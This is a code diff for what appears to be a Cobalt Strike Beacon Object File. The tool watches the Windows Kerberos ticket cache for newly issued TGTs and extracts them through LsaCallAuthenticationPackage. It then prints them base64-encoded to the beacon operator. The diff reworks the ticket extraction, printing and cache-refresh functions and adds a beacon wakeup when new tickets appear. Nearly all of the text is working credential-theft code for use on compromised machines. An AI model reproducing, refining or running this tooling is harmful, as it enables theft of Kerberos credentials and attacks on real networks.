@@ -44,22 +44,22 @@ NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING
     _memcpy(request->TargetName.Buffer, target.Buffer, target.MaximumLength);
 
     status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, (PVOID*)&response, &responseSize, &protocolStatus);
-    if (!NT_SUCCESS(status) || !NT_SUCCESS(protocolStatus) || !response) {
-        MemFree(request);
-        return status;
+    MemFree(request);
+
+    if (!NT_SUCCESS(status) || !NT_SUCCESS(protocolStatus) || responseSize == 0) {
+        if (response) SECUR32$LsaFreeReturnBuffer(response);
+        return NT_SUCCESS(status) ? protocolStatus : status;
     }
 
     *ticketSize = response->Ticket.EncodedTicketSize;
     *ticket = (PUCHAR)MemAlloc(*ticketSize);
     if (!*ticket) {
-        MemFree(request);
         SECUR32$LsaFreeReturnBuffer(response);
         return STATUS_MEMORY_NOT_ALLOCATED;
     }
 
     _memcpy(*ticket, response->Ticket.EncodedTicket, *ticketSize);
     SECUR32$LsaFreeReturnBuffer(response);
-    MemFree(request);
     return STATUS_SUCCESS;
 }
 
@@ -170,24 +170,22 @@ NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTIC
 
 #define PrintFlag(mask, name) if (flags & (mask)) { BeaconPrintf(CALLBACK_OUTPUT, f ? name : ", " name); f = FALSE; }
 
-VOID PrintTicketInformation(PTICKET_ENTRY entry, PBYTE ticket, ULONG ticketSize) {
-    
-    KERB_TICKET_CACHE_INFO_EX* cacheInfo = &entry->cacheInfo;
+VOID PrintTicketInformation(KERB_TICKET_CACHE_INFO_EX cacheInfo, LUID luid) {
     SYSTEMTIME now, start, end, renew;
     
     KERNEL32$GetSystemTime(&now);
-    start = ConvertToSystemtime(cacheInfo->StartTime);
-    end   = ConvertToSystemtime(cacheInfo->EndTime);
-    renew = ConvertToSystemtime(cacheInfo->RenewTime);
+    start = ConvertToSystemtime(cacheInfo.StartTime);
+    end   = ConvertToSystemtime(cacheInfo.EndTime);
+    renew = ConvertToSystemtime(cacheInfo.RenewTime);
 
     // Build "ClientName@ClientRealm"
     char user[512] = { 0 };
-    int cnChars = cacheInfo->ClientName.Length / 2;
-    int crChars = cacheInfo->ClientRealm.Length / 2;
-    int cnBytes = KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo->ClientName.Buffer, cnChars, user, sizeof(user) - 1, NULL, NULL);
+    int cnChars = cacheInfo.ClientName.Length / 2;
+    int crChars = cacheInfo.ClientRealm.Length / 2;
+    int cnBytes = KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ClientName.Buffer, cnChars, user, sizeof(user) - 1, NULL, NULL);
     if (cnBytes < 0) cnBytes = 0;
     user[cnBytes] = '@';
-    KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo->ClientRealm.Buffer, crChars, user + cnBytes + 1, (int)sizeof(user) - cnBytes - 2, NULL, NULL);
+    KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ClientRealm.Buffer, crChars, user + cnBytes + 1, (int)sizeof(user) - cnBytes - 2, NULL, NULL);
 
     // Header
     int nowHour = now.wHour % 12; if (!nowHour) nowHour = 12;
@@ -201,15 +199,12 @@ VOID PrintTicketInformation(PTICKET_ENTRY entry, PBYTE ticket, ULONG ticketSize)
     int sh = start.wHour % 12; if (!sh) sh = 12;
     int eh = end.wHour   % 12; if (!eh) eh = 12;
     int rh = renew.wHour % 12; if (!rh) rh = 12;
-    BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  %d/%d/%d %d:%02d:%02d %s\n",
-        start.wMonth, start.wDay, start.wYear, sh, start.wMinute, start.wSecond, start.wHour >= 12 ? "PM" : "AM");
-    BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  %d/%d/%d %d:%02d:%02d %s\n",
-        end.wMonth, end.wDay, end.wYear, eh, end.wMinute, end.wSecond, end.wHour >= 12 ? "PM" : "AM");
-    BeaconPrintf(CALLBACK_OUTPUT, "  RenewTill      :  %d/%d/%d %d:%02d:%02d %s\n",
-        renew.wMonth, renew.wDay, renew.wYear, rh, renew.wMinute, renew.wSecond, renew.wHour >= 12 ? "PM" : "AM");
+    BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  %d/%d/%d %d:%02d:%02d %s\n", start.wMonth, start.wDay, start.wYear, sh, start.wMinute, start.wSecond, start.wHour >= 12 ? "PM" : "AM");
+    BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  %d/%d/%d %d:%02d:%02d %s\n", end.wMonth, end.wDay, end.wYear, eh, end.wMinute, end.wSecond, end.wHour >= 12 ? "PM" : "AM");
+    BeaconPrintf(CALLBACK_OUTPUT, "  RenewTill      :  %d/%d/%d %d:%02d:%02d %s\n", renew.wMonth, renew.wDay, renew.wYear, rh, renew.wMinute, renew.wSecond, renew.wHour >= 12 ? "PM" : "AM");
 
     // Flags (comma-separated)
-    UINT flags = cacheInfo->TicketFlags;
+    UINT flags = cacheInfo.TicketFlags;
     BOOL f = TRUE;
     BeaconPrintf(CALLBACK_OUTPUT, "  Flags          :  ");
     PrintFlag(reserved, "reserved")
@@ -234,7 +229,7 @@ VOID PrintTicketInformation(PTICKET_ENTRY entry, PBYTE ticket, ULONG ticketSize)
 
 VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CACHE curr) {
 
-    int newCount = 0;
+    BOOL cacheUpdated = FALSE; 
 
     // Compare ticket caches to identify new TGTs
     for (int i = 0; i < curr->count; i++) {
@@ -261,25 +256,27 @@ VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CA
                 .MaximumLength = (USHORT)(_wcslen(currEntry->spn) * 2 + 2)
             };
 
+            PrintTicketInformation(currEntry->cacheInfo, currEntry->luid);
+
             PBYTE ticket = NULL;
             ULONG ticketSize = 0;
-            if (NT_SUCCESS(ExtractTicket(hLsa, authPackage, currEntry->luid, target, &ticket, &ticketSize))) {
-                PrintTicketInformation(currEntry, ticket, ticketSize);
-                if (ticket && ticketSize) {
-                    char* b64 = Base64Encode(ticket, ticketSize);
-                    if (b64) {
-                        BeaconPrintf(CALLBACK_OUTPUT, "\n%s\n", b64);
-                        MemFree(b64);
-                    }
+            if (NT_SUCCESS(ExtractTicket(hLsa, authPackage, currEntry->luid, target, &ticket, &ticketSize)) && ticket && ticketSize) {
+                char* b64 = Base64Encode(ticket, ticketSize);
+                if (b64) {
+                    BeaconPrintf(CALLBACK_OUTPUT, "\n%s\n", b64);
+                    MemFree(b64);
                 }
                 MemFree(ticket);
-                newCount++;
             }
+
+            cacheUpdated = TRUE;
         }
     }
 
-    if (newCount > 0)
+    if (cacheUpdated){
         BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Tickets in cache: %d\n", curr->count);
+        BeaconWakeup(); 
+    }
 }
 
 VOID go(char* args, int argc) {
